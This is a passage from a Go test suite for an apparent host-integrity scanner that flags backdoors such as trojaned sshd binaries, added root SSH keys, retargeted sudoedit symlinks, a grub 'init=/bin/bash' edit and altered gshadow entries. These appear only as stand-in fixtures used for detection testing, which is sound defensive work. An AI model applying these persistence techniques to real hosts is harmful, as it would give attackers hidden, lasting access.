		t.Errorf("collection skip missing: %+v", r.Skipped)
	}
	if !slices.ContainsFunc(r.Skipped, func(s model.Skip) bool {
		return s.Check == "TT-SSH-001" && strings.Contains(s.Reason, "no sshd configuration")
	}) {
		t.Errorf("check skip missing: %+v", r.Skipped)
	}
	if r.Schema != model.ReportSchema || r.Host.Hostname != "web01" || !r.Time.Equal(now) {
		t.Errorf("header %+v %v %v", r.Host, r.Schema, r.Time)
	}
}

// --- review round 1: paths where a backdoor was explained, dropped or
// downgraded ---

// C1: an "upgrade" to a version no trusted source has must not explain the
// programs it replaced.
func TestJudgeUnofficialUpgradeIsBackdoor(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd", "/usr/share/doc/openssh-server/README"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755), file("/usr/share/doc/openssh-server/README", "r", 0o644))
	cur := clone(old)
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u9")
	setFile(cur, file("/usr/sbin/sshd", "trojan sshd", 0o755))
	setFile(cur, file("/usr/share/doc/openssh-server/README", "r2", 0o644))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{
		{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "1:9.2p1-2+deb12u9", Actual: h("trojan sshd"), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound},
		{Path: "/usr/share/doc/openssh-server/README", Package: "openssh-server", Version: "1:9.2p1-2+deb12u9", Actual: h("r2"), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}

	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/sbin/sshd") || f.Evidence[0].Before != "1:9.2p1-2+deb12u3" || !strings.HasPrefix(f.Evidence[0].After, "1:9.2p1-2+deb12u9; files sha256:") {
		t.Errorf("evidence %+v", f.Evidence)
	}
	// Nothing a version no trusted source has changed is explained: the
	// documentation file is listed too.
	if !hasEvidencePath(f, "/usr/share/doc/openssh-server/README") {
		t.Errorf("non-program file of an unconfirmed version not listed: %+v", f.Evidence)
	}
	if !strings.Contains(f.Title, "2 files changed") {
		t.Errorf("title %q", f.Title)
	}
	if explained(r, "explained:openssh-server") != nil {
		t.Errorf("unofficial upgrade explained")
	}
	if r.ExitCode != 2 {
		t.Errorf("exit %d", r.ExitCode)
	}

	// A new package whose programs no trusted source has.
	cur2 := clone(old)
	cur2.Packages.Installed = append(cur2.Packages.Installed, pkg("tool", "1.0", "/usr/bin/tool"))
	cur2.Files = append(cur2.Files, file("/usr/bin/tool", "tool", 0o755))
	res2 := archive()
	res2.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/bin/tool", Package: "tool", Version: "1.0", Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
	n := must(t, run(cur2, snapOf(old), res2), "snap.pkg_installed:tool", model.SevBackdoor)
	if !hasEvidencePath(n, "/usr/bin/tool") {
		t.Errorf("unverified program not on the package: %+v", n.Evidence)
	}

	// A routine-looking kernel package whose modules no trusted source has.
	old3 := clean()
	old3.Packages.Installed = append(old3.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3"))
	cur3 := clone(old3)
	ko := "/lib/modules/6.1.0-99-amd64/kernel/x.ko"
	cur3.Packages.Installed = append(cur3.Packages.Installed, pkg("linux-image-6.1.0-99-amd64", "6.1.999-1", ko))
	cur3.Files = append(cur3.Files, file(ko, "ko", 0o644))
	res3 := archive()
	res3.Unverifiable = []pkgverify.FileVerdict{{Path: ko, Package: "linux-image-6.1.0-99-amd64", Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
	r = run(cur3, snapOf(old3), res3)
	must(t, r, "snap.pkg_installed:linux-image-6.1.0-99-amd64", model.SevBackdoor)
	if explained(r, "explained:linux-image-6.1.0-99-amd64") != nil {
		t.Errorf("unverifiable kernel explained")
	}
}

// I1: an exception covers only what it accepted.
func TestJudgeExceptionValuesCoverWhatMakesItSerious(t *testing.T) {
	// A listener accepted for a packaged program, later served by another.
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("nginx", "1.22", "/usr/sbin/nginx"))
	old.Files = append(old.Files, file("/usr/sbin/nginx", "nginx", 0o755), file("/usr/local/bin/evil", "evil", 0o755))
	cur := clone(old)
	cur.Runtime.Processes = []model.Process{{PID: 10, UID: 0, Exe: "/usr/sbin/nginx"}}
	cur.Runtime.Sockets = []model.Socket{{Proto: "tcp", Local: "0.0.0.0:8080", State: "LISTEN", Listening: true, PID: 10}}
	s := snapOf(old)
	f := must(t, run(cur, s, nil), "snap.listener:tcp:0.0.0.0:8080", model.SevNote)
	s.Exceptions = []model.Exception{{FindingKey: f.Key, AcceptedValue: currentValue(f), At: taken}}
	absent(t, run(cur, s, nil), "snap.listener:tcp:0.0.0.0:8080")
	cur2 := clone(cur)
	cur2.Runtime.Processes = []model.Process{{PID: 66, UID: 0, Exe: "/usr/local/bin/evil"}}
	cur2.Runtime.Sockets[0].PID = 66
	must(t, run(cur2, s, nil), "snap.listener:tcp:0.0.0.0:8080", model.SevBackdoor)

	// A module accepted from its package file, later loaded from another.
	oldm := clean()
	oldm.Packages.Installed = append(oldm.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", "/lib/modules/6.1.0-25-amd64/kernel/net/wg.ko"))
	curm := clone(oldm)
	curm.Runtime.Modules = []model.KernelModule{{Name: "wg", File: "/lib/modules/6.1.0-25-amd64/kernel/net/wg.ko"}}
	sm := snapOf(oldm)
	m := must(t, run(curm, sm, nil), "snap.module:wg", model.SevNote)
	sm.Exceptions = []model.Exception{{FindingKey: m.Key, AcceptedValue: currentValue(m), At: taken}}
	absent(t, run(curm, sm, nil), "snap.module:wg")
	curm2 := clone(oldm)
	curm2.Runtime.Modules = []model.KernelModule{{Name: "wg", File: "/lib/modules/6.1.0-25-amd64/extra/wg.ko"}}
	must(t, run(curm2, sm, nil), "snap.module:wg", model.SevBackdoor)

	// A new package accepted as a note, which later gains an enabled unit.
	oldp := clean()
	curp := clone(oldp)
	curp.Packages.Installed = append(curp.Packages.Installed, pkg("foo", "1.0", "/usr/bin/foo", "/usr/lib/systemd/system/foo.service"))
	curp.Files = append(curp.Files, file("/usr/bin/foo", "foo", 0o755), file("/usr/lib/systemd/system/foo.service", "[Service]", 0o644))
	res := archive(pkgverify.FileVerdict{Path: "/usr/bin/foo", Package: "foo", Version: "1.0", Expected: h("foo"), Actual: h("foo"), Source: "archive"},
		pkgverify.FileVerdict{Path: "/usr/lib/systemd/system/foo.service", Package: "foo", Version: "1.0", Expected: h("[Service]"), Actual: h("[Service]"), Source: "archive"})
	sp := snapOf(oldp)
	pf := must(t, run(curp, sp, res), "snap.pkg_installed:foo", model.SevNote)
	sp.Exceptions = []model.Exception{{FindingKey: pf.Key, AcceptedValue: currentValue(pf), At: taken}}
	if r := run(curp, sp, res); r.ExitCode != 0 {
		t.Errorf("accepted package still reported: %v", keys(r))
	}
	curp2 := clone(curp)
	curp2.Persist = append(curp2.Persist, model.PersistFile{Path: "/etc/systemd/system/multi-user.target.wants/foo.service", Kind: model.PersistKindSystemdEnabled,
		Mode: 0o120777, Lines: []string{"/usr/lib/systemd/system/foo.service"}, SHA256: h("link")})
	must(t, run(curp2, sp, res), "snap.pkg_installed:foo", model.SevBackdoor)
}

// I1: evidence folded into a finding is not dropped with it when it would
// rank higher on its own.
func TestJudgeExceptionKeepsMoreSeriousFoldedEvidence(t *testing.T) {
	s := snapOf(clean())
	s.Exceptions = []model.Exception{{FindingKey: "snap.pkg_removed:x", AcceptedValue: "removed", At: taken}}
	j := newJudge(Input{Collection: clean(), Snapshot: s}, clean())
	f := j.add(&model.Finding{Key: "snap.pkg_removed:x", Severity: model.SevNote, Evidence: []model.Evidence{{After: "removed"}}})
	j.pkgFinding["x"] = f
	j.foldIntoPackage("x", model.Evidence{Path: "/etc/cron.d/x", Detail: "changed"}, model.SevNote)
	if j.exceptions(); len(j.findings) != 0 {
		t.Fatalf("note-level folded evidence kept an accepted finding")
	}
	j = newJudge(Input{Collection: clean(), Snapshot: s}, clean())
	f = j.add(&model.Finding{Key: "snap.pkg_removed:x", Severity: model.SevNote, Evidence: []model.Evidence{{After: "removed"}}})
	j.pkgFinding["x"] = f
	j.foldIntoPackage("x", model.Evidence{Path: "/etc/cron.d/x", Detail: "changed"}, model.SevBackdoor)
	if j.exceptions(); len(j.findings) != 1 {
		t.Fatalf("backdoor-level folded evidence dropped with an accepted note")
	}
}

// I2: account files are only quiet when the account comparison shows what
// changed in them.
func TestJudgeAccountFilesComparedWhenAccountsDoNotExplainThem(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/etc/gshadow", "sudo:!::", 0o640), file("/etc/subuid", "alice:100000:65536", 0o644),
		file("/etc/passwd", "root:x:0:0", 0o644), file("/etc/shadow", "root:$y$a", 0o640))
	cur := clone(old)
	setFile(cur, file("/etc/gshadow", "sudo:$y$hash::", 0o640))
	setFile(cur, file("/etc/subuid", "alice:0:1", 0o644))
	setFile(cur, file("/etc/passwd", "root:x:0:0\nroot:x:0:0:dup", 0o644))
	r := run(cur, snapOf(old), nil)
	must(t, r, "snap.file_modified:/etc/gshadow", model.SevBackdoor)
	sub := must(t, r, "snap.file_modified:/etc/subuid", model.SevBackdoor)
	if !strings.Contains(sub.Why, "id 0") {
		t.Errorf("subuid why %q", sub.Why)
	}
	// passwd content the account comparison does not see (ageing, comments,
	// a line it skips) is a note; duplicate names are their own finding.
	must(t, r, "snap.file_modified:/etc/passwd", model.SevNote)

	// A password change explains /etc/shadow's new content.
	cur2 := clone(old)
	cur2.Accounts.Users[0].Password.Digest = "digest-root-2"
	setFile(cur2, file("/etc/shadow", "root:$y$b", 0o640))
	r = run(cur2, snapOf(old), nil)
	absent(t, r, "snap.file_modified:/etc/shadow")
	must(t, r, "snap.user_changed:root", model.SevNote)
}

func TestJudgeDuplicateAccountNames(t *testing.T) {
	// A collection that still lists both entries.
	c := clean()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "root", UID: 0, Home: "/root", Shell: "/bin/sh"})
	f := must(t, run(c, nil, nil), "acct.duplicate:/etc/passwd:root", model.SevBackdoor)
	if len(f.Evidence) != 2 {
		t.Errorf("evidence %+v", f.Evidence)
	}
	must(t, run(c, snapOf(clean()), nil), "acct.duplicate:/etc/passwd:root", model.SevBackdoor)

	// What the collector reports: duplicates and lines glibc rejects.
	c = clean()
	c.Accounts.Duplicates = []string{"/etc/shadow:root", "/etc/group:sudo"}
	c.Accounts.Malformed = []string{"/etc/passwd:7"}
	r := run(c, nil, nil)
	must(t, r, "acct.duplicate:/etc/shadow:root", model.SevBackdoor)
	must(t, r, "acct.duplicate:/etc/group:sudo", model.SevBackdoor)
	must(t, r, "acct.malformed:/etc/passwd:7", model.SevBackdoor)
}

// I3: boot files fold only into the packages that rebuild them.
func TestJudgeBootFilesFoldOnlyIntoRebuilders(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("grub-pc", "2.06-13+deb12u1"),
		pkg("udev", "252.30-1~deb12u2", "/usr/share/initramfs-tools/hooks/udev"))
	old.Files = append(old.Files, file("/boot/grub/grub.cfg", "menu", 0o444), file("/boot/grub/x86_64-efi/normal.mod", "mod", 0o644),
		file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644), file("/boot/efi/EFI/debian/grubx64.efi", "efi", 0o755))
	edit := func(c *model.Collection) {
		setFile(c, file("/boot/grub/grub.cfg", "menu init=/bin/bash", 0o444))
		setFile(c, file("/boot/grub/x86_64-efi/normal.mod", "evil mod", 0o644))
		setFile(c, file("/boot/initrd.img-6.1.0-25-amd64", "evil initrd", 0o644))
		setFile(c, file("/boot/efi/EFI/debian/grubx64.efi", "evil efi", 0o755))
	}
	boot := []string{"/boot/grub/grub.cfg", "/boot/grub/x86_64-efi/normal.mod", "/boot/initrd.img-6.1.0-25-amd64", "/boot/efi/EFI/debian/grubx64.efi"}

	// An unrelated upgrade explains none of them.
	cur := clone(old)
	setVersion(cur, "unattended-upgrades", "2.9.1+nmu4")
	edit(cur)
	r := run(cur, snapOf(old), archive())
	for _, p := range boot {
		must(t, r, "snap.file_modified:"+p, model.SevBackdoor)
	}

	// A GRUB upgrade rebuilds the menu, the modules and the EFI binary, not
	// the initramfs.
	cur = clone(old)
	setVersion(cur, "grub-pc", "2.06-13+deb12u2")
	edit(cur)
	r = run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/lib/grub/i386-pc/kernel.img", Package: "grub-pc", Version: "2.06-13+deb12u2", Source: "archive"}))
	for _, p := range boot[:2] {
		absent(t, r, "snap.file_modified:"+p)
	}
	absent(t, r, "snap.file_modified:/boot/efi/EFI/debian/grubx64.efi")
	must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)

	// A package with an initramfs hook rebuilds the initramfs of every
	// kernel.
	cur = clone(old)
	setVersion(cur, "udev", "252.31-1~deb12u1")
	edit(cur)
	r = run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/share/initramfs-tools/hooks/udev", Package: "udev", Version: "252.31-1~deb12u1", Source: "archive"}))
	absent(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64")
	if g := explained(r, "explained:udev"); g == nil || !hasEvidencePath(g, "/boot/initrd.img-6.1.0-25-amd64") {
		t.Errorf("initramfs not shown with the hook package: %+v", g)
	}
	must(t, r, "snap.file_modified:/boot/grub/grub.cfg", model.SevBackdoor)
}

// I4: a package change does not cover a loosened directory or a link that
// now points somewhere it should not.
func TestJudgePackageDirsAndLinksAreChecked(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("sudo", "1.9.13p3-1+deb12u1", "/etc/sudoers.d", "/usr/bin/sudoedit", "/usr/share/doc/sudo"))
	old.Files = append(old.Files,
		model.FileEntry{Path: "/etc/sudoers.d", Type: "dir", Mode: 0o040750, MTime: taken, CTime: taken},
		model.FileEntry{Path: "/usr/share/doc/sudo", Type: "dir", Mode: 0o040755, MTime: taken, CTime: taken},
		model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "sudo", Mode: 0o120777, MTime: taken, CTime: taken})
	cur := clone(old)
	setVersion(cur, "sudo", "1.9.13p3-1+deb12u2")
	setFile(cur, model.FileEntry{Path: "/etc/sudoers.d", Type: "dir", Mode: 0o040777, MTime: changed, CTime: changed})
	setFile(cur, model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "/tmp/.x/evil", Mode: 0o120777, MTime: changed, CTime: changed})
	setFile(cur, model.FileEntry{Path: "/usr/share/doc/sudo", Type: "dir", Mode: 0o040775, MTime: changed, CTime: changed})
	for _, withUpgrade := range []bool{true, false} {
		c := clone(cur)
		if !withUpgrade {
			setVersion(c, "sudo", "1.9.13p3-1+deb12u1")
		}
		r := run(c, snapOf(old), archive())
		must(t, r, "snap.file_modified:/etc/sudoers.d", model.SevBackdoor)
		must(t, r, "snap.file_modified:/usr/bin/sudoedit", model.SevBackdoor)
		must(t, r, "snap.file_modified:/usr/share/doc/sudo", model.SevBackdoor)
	}

	// A link retargeted out of the system directories.
	c := clone(old)
	setFile(c, model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "/opt/x/sudo", Mode: 0o120777})
	must(t, run(c, snapOf(old), archive()), "snap.file_modified:/usr/bin/sudoedit", model.SevBackdoor)
	// Retargeted within them during an upgrade: shown with the upgrade,
	// which is explained only when something confirmed the new version.
	// The new target is the package's own file.
	setVersion(c, "sudo", "1.9.13p3-1+deb12u2")
	setFile(c, model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "/usr/libexec/sudo/sudoedit", Mode: 0o120777})
	c.Files = append(c.Files, file("/usr/libexec/sudo/sudoedit", "sudoedit", 0o755))
	for i := range c.Packages.Installed {
		if c.Packages.Installed[i].Name == "sudo" {
			c.Packages.Installed[i].Files = append(c.Packages.Installed[i].Files, "/usr/libexec/sudo/sudoedit")
		}
	}
	r := run(c, snapOf(old), archive())
	absent(t, r, "snap.file_modified:/usr/bin/sudoedit")
	if f := must(t, r, "snap.pkg_upgraded:sudo", model.SevNote); !hasEvidencePath(f, "/usr/bin/sudoedit") || explained(r, "explained:sudo") != nil {
		t.Errorf("unconfirmed upgrade: %+v", f)
	}
}

// I5: the machine's own checksums never explain a content change at the
// same package version, and are never called signed.
func TestJudgeOfflineNeverExplainsSameVersion(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755))
	cur := clone(old)
	setFile(cur, file("/usr/sbin/sshd", "trojan", 0o755))
	off := func() *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeOfflineLocal, Errors: []string{pkgverify.OfflineWarning},
			Verified: []pkgverify.FileVerdict{{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "", Expected: "md5:aa", Actual: "md5:aa", Source: pkgverify.SourceOfflineLocal}}}
	}
	r := run(cur, snapOf(old), off())
	must(t, r, "snap.file_modified:/usr/sbin/sshd", model.SevBackdoor)

	// After an upgrade they may explain it, in honest words.
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u4")
	r = run(cur, snapOf(old), off())
	absent(t, r, "snap.file_modified:/usr/sbin/sshd")
	g := explained(r, "explained:openssh-server")
	if g == nil {
		t.Fatalf("upgrade not explained: %v", keys(r))
	}
	b, _ := json.Marshal(r)
	if strings.Contains(string(b), "signed") {
		t.Errorf("offline report calls something signed: %s", b)
	}
	if !strings.Contains(g.Why+g.Evidence[1].Detail, "own package checksums") {
		t.Errorf("group does not say what explained it: %+v", g)
	}
}

// M1: a symlinked authorized_keys: Lines[0] is the link target.
func TestJudgeSymlinkedAuthorizedKeys(t *testing.T) {
	link := func(path, target string, lines ...string) model.PersistFile {
		return model.PersistFile{Path: path, Kind: model.PersistKindAuthorizedKeys, Mode: 0o120777, SHA256: h(strings.Join(lines, "\n")),
			Lines: append([]string{target}, lines...), MTime: changed}
	}
	old := clean()
	old.Accounts.Users = append(old.Accounts.Users, model.User{Name: "alice", UID: 1000, GID: 1000, Home: "/home/alice", Shell: "/bin/bash",
		Password: model.PasswordState{Known: true, Locked: true, LastChange: 20000}})
	old.Persist = []model.PersistFile{link("/home/alice/.ssh/authorized_keys", "../keys", ownerKey), link("/root/.ssh/authorized_keys", "/etc/ssh/keys/root", ownerKey)}
	old.Files = append(old.Files, file("/home/alice/keys", "keys", 0o600)) // what the collector records for the link's chain
	cur := clone(old)
	cur.Persist = []model.PersistFile{link("/home/alice/.ssh/authorized_keys", "../keys", evilKey, ownerKey), link("/root/.ssh/authorized_keys", "/etc/ssh/keys/root", evilKey, ownerKey)}

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.root_key:/root/.ssh/authorized_keys:1", model.SevBackdoor)
	want := evidenceCopy + "'/root/.ssh/authorized_keys' '/etc/ssh/keys/root' /root/telltale-evidence/ && " + stillAsSeen("/etc/ssh/keys/root", cur.Persist[1].SHA256) + " && sed -i '1d' '/etc/ssh/keys/root'"
	if !strings.HasPrefix(f.Fix, want) || f.Evidence[0].Line != 1 {
		t.Errorf("fix %q evidence %+v", f.Fix, f.Evidence[0])
	}
	absent(t, r, "snap.root_key:/root/.ssh/authorized_keys:2")
	g := must(t, r, "snap.persist:/home/alice/.ssh/authorized_keys", model.SevBackdoor)
	if !strings.Contains(g.Fix, "sed -i '1d' '/home/alice/keys'") || !slices.ContainsFunc(g.Evidence, func(e model.Evidence) bool { return e.Line == 1 && e.After == evilKey }) {
		t.Errorf("fix %q evidence %+v", g.Fix, g.Evidence)
	}
}

// M2: an executable or library under root's cache is reported.
func TestJudgeRootCacheExecutablesReported(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Files = append(cur.Files, file("/root/.cache/pip/http/abc", "cache", 0o600), file("/root/.cache/x/run", "elf", 0o755), file("/root/.cache/x/libx.so", "so", 0o644))
	r := run(cur, snapOf(old), nil)
	absent(t, r, "snap.file_added:/root/.cache/pip/http/abc")
	must(t, r, "snap.file_added:/root/.cache/x/run", model.SevBackdoor)
	must(t, r, "snap.file_added:/root/.cache/x/libx.so", model.SevBackdoor)
}

// M3: a scan without root, or with nothing collected, never looks clean.
func TestJudgeNonRootAndNothingCollectedStated(t *testing.T) {
	c := clean()
	c.AsRoot = false
	r := run(c, nil, nil)
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "checks that need root were skipped") }) {
		t.Errorf("non-root limit missing: %q", r.CouldNotRuleOut)
	}
	if r := run(clean(), nil, nil); slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "need root") }) {
		t.Errorf("root scan says root was missing")
	}
	r = Judge(Input{Context: ctx, Now: now})
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "nothing was collected") }) {
		t.Errorf("nil collection: %q", r.CouldNotRuleOut)
	}
}

// M4: names in commands come after "--", and a purge saves the package's
// files first.
func TestJudgeFixNamesAfterEndOfOptions(t *testing.T) {
	purge := fixPurge("-evil")
	for _, want := range []string{"dpkg -L -- '-evil'", "cp -a --parents -- \"$f\" /root/telltale-evidence/", ") && apt-get purge -- '-evil'"} {
		if !strings.Contains(purge, want) {
			t.Errorf("purge fix %q lacks %q", purge, want)
		}
	}
	if s := fixUserAdded("-r", false); !strings.Contains(s, "userdel -- '-r'") {
		t.Errorf("userdel fix %q", s)
	}
	if s := fixGroupMembers("sudo", []string{"-x"}); !strings.Contains(s, "gpasswd -d '-x' -- 'sudo'") {
		t.Errorf("gpasswd fix %q", s)
	}
}

// M6: Ubuntu's kernel companions follow the same flavour rule.
func TestJudgeKernelCompanionsExplained(t *testing.T) {
	old := clean()
	old.Host.OSID = "ubuntu"
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.8.0-45-generic", "6.8.0-45.45"), pkg("linux-tools-6.8.0-45", "6.8.0-45.45"))
	cur := clone(old)
	news := []string{"linux-image-6.8.0-49-generic", "linux-image-unsigned-6.8.0-49-generic", "linux-tools-6.8.0-49-generic", "linux-tools-6.8.0-49",
		"linux-cloud-tools-6.8.0-49-generic", "linux-modules-nvidia-550-6.8.0-49-generic", "linux-objects-nvidia-550-server-6.8.0-49-generic"}
	for _, n := range news {
		cur.Packages.Installed = append(cur.Packages.Installed, pkg(n, "6.8.0-49.49+1"))
	}
	r := run(cur, snapOf(old), nil)
	for _, n := range news {
		absent(t, r, "snap.pkg_installed:"+n)
	}
	// A flavourless tools package needs a flavourless one before it.
	cur2 := clone(old)
	cur2.Packages.Installed = append(cur2.Packages.Installed, pkg("linux-cloud-tools-6.8.0-49", "6.8.0-49.49"))
	must(t, run(cur2, snapOf(old), nil), "snap.pkg_installed:linux-cloud-tools-6.8.0-49", model.SevNote)
}

// R52: verification that could not run is one note, not a backdoor sign per
// package; only a version no trusted source has is a backdoor sign.
func TestJudgeUncheckedPackagesAreOneNote(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed,
		pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd"), pkg("sudo", "1.9.13p3-1+deb12u1", "/usr/bin/sudo"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755), file("/usr/bin/sudo", "sudo", 0o4755))
	cur := clone(old)
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u4")
	setVersion(cur, "sudo", "1.9.13p3-1+deb12u2")
	setFile(cur, file("/usr/sbin/sshd", "sshd 2", 0o755))
	setFile(cur, file("/usr/bin/sudo", "sudo 2", 0o4755))
	timeout := `could not check the package: Get "https://deb.debian.org/debian/pool/main/o/openssh/x.deb": dial tcp 151.101.2.132:443: i/o timeout`
	res := &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
		{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "1:9.2p1-2+deb12u4", Reason: timeout, Kind: pkgverify.KindUnreachable},
		{Path: "/usr/bin/sudo", Package: "sudo", Version: "1.9.13p3-1+deb12u2", Reason: "could not read the official archive index: 503 Service Unavailable", Kind: pkgverify.KindUnreachable}}}

	r := run(cur, snapOf(old), res)
	for _, k := range []string{"snap.pkg_upgraded:openssh-server", "snap.pkg_upgraded:sudo", "pkg.unverifiable:/usr/bin/sudo", "snap.file_modified:/usr/sbin/sshd"} {
		absent(t, r, k)
	}
	f := must(t, r, "pkg.unchecked_changes", model.SevNote)
	if f.Title != "2 package files could not be checked because the package archive could not be reached" || !hasEvidencePath(f, "/usr/sbin/sshd") || !hasEvidencePath(f, "/usr/bin/sudo") {
		t.Errorf("unchecked note %q %+v", f.Title, f.Evidence)
	}
	if explained(r, "explained:openssh-server") != nil || explained(r, "explained:sudo") != nil {
		t.Errorf("unchecked upgrades explained")
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "i/o timeout") && strings.Contains(s, "503") }) {
		t.Errorf("reasons not stated: %q", r.CouldNotRuleOut)
	}
	if r.ExitCode != 1 {
		t.Errorf("exit %d (%v)", r.ExitCode, keys(r))
	}

	// A reference bundle whose indexes were read but that lacks a package
	// (R61: a root-chosen version only HTTPS sources have) confirmed
	// nothing: both are backdoor signs.
	res2 := &pkgverify.Result{Mode: pkgverify.ModeRefs, SourcesUsed: []string{"reference bundle /mnt/refs"}, Unverifiable: []pkgverify.FileVerdict{
		{Path: "/usr/sbin/sshd", Package: "openssh-server", Reason: "package not in the reference bundle", Kind: pkgverify.KindNotFound},
		{Path: "/usr/bin/sudo", Package: "sudo", Reason: "not in the reference bundle: " + pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}}
	r = run(cur, snapOf(old), res2)
	must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	must(t, r, "snap.pkg_upgraded:sudo", model.SevBackdoor)
	must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
	absent(t, r, "pkg.unchecked_changes")
}

// R53: gshadow changes that the group comparison explains are notes, unless
// they give a group a password or a privileged group a member or admin.
func TestJudgeGShadowChangesWithGroups(t *testing.T) {
	base := func() *model.Collection {
		c := clean()
		for i := range c.Accounts.Groups {
			c.Accounts.Groups[i].Shadow = &model.GroupShadow{}
		}
		c.Files = append(c.Files, file("/etc/gshadow", "gshadow", 0o640), file("/etc/group", "group", 0o644))
		return c
	}
	old := base()
	edit := func(f func(c *model.Collection)) *model.Report {
		cur := clone(old)
		f(cur)
		setFile(cur, file("/etc/gshadow", "gshadow 2", 0o640))
		setFile(cur, file("/etc/group", "group 2", 0o644))
		return run(cur, snapOf(old), nil)
	}

	// adduser: a new group in both files.
	r := edit(func(c *model.Collection) {
		c.Accounts.Groups = append(c.Accounts.Groups, model.Group{Name: "alice", GID: 1000, Shadow: &model.GroupShadow{}})
	})
	must(t, r, "snap.file_modified:/etc/gshadow", model.SevNote)
	absent(t, r, "snap.file_modified:/etc/group")

	// A group password.
	r = edit(func(c *model.Collection) { c.Accounts.Groups[2].Shadow.PasswordSet = true })
	must(t, r, "snap.file_modified:/etc/gshadow", model.SevBackdoor)
	g := must(t, r, "snap.group:staff", model.SevBackdoor)
	if !strings.Contains(g.Fix, "gpasswd -r -- 'staff'") {
		t.Errorf("fix %q", g.Fix)
	}
	// An administrator for a privileged group.
	r = edit(func(c *model.Collection) { c.Accounts.Groups[1].Shadow.Admins = []string{"eve"} })
	must(t, r, "snap.file_modified:/etc/gshadow", model.SevBackdoor)
	must(t, r, "snap.group:sudo", model.SevBackdoor)

	// gshadow changed with no group change to show for it.
	cur := clone(old)
	setFile(cur, file("/etc/gshadow", "gshadow 2", 0o640))
	must(t, run(cur, snapOf(old), nil), "snap.file_modified:/etc/gshadow", model.SevBackdoor)

	// shadow content with no password change seen (ageing): a note.
	old2 := clean()
	old2.Files = append(old2.Files, file("/etc/shadow", "root:$y$a:20000", 0o640))
	cur2 := clone(old2)
	setFile(cur2, file("/etc/shadow", "root:$y$a:20001", 0o640))
	must(t, run(cur2, snapOf(old2), nil), "snap.file_modified:/etc/shadow", model.SevNote)
}

// The flags a filesystem keeps for its own bookkeeping (extents, inline
// data, huge file, hash index) move when a file is rewritten or the machine
// is restored onto another filesystem. They are not a change to a file and
// do not make a routine change look like more; the immutable and
// append-only flags still count.
func TestJudgeFilesystemLayoutFlagsAreNotAChange(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/etc/shadow", "root:$y$a:20000", 0o640))
	cur := clone(old)
	// Restored from xfs onto ext4, where every file has extents.
	for i := range cur.Files {
		cur.Files[i].Flags |= 0x80000
	}
	// An ageing change, the file small enough to have been inline before.
	old.Files[len(old.Files)-1].Flags = 0x10000000
	shadow := file("/etc/shadow", "root:$y$a:20001", 0o640)
	shadow.Flags = 0x80000
	setFile(cur, shadow)
	r := run(cur, snapOf(old), nil)
	for _, p := range []string{"/usr/bin/ls", "/usr/bin/openssl", "/etc/hostname"} {
		absent(t, r, "snap.file_modified:"+p)
	}
	must(t, r, "snap.file_modified:/etc/shadow", model.SevNote)

	// An owner's flag still counts, with extents beside it.
	ls := file("/usr/bin/ls", "ls 9.1", 0o755)
	ls.Flags = 0x80010
	setFile(cur, ls)
	r = run(cur, snapOf(old), nil)
	must(t, r, "snap.file_modified:/usr/bin/ls", model.SevBackdoor)
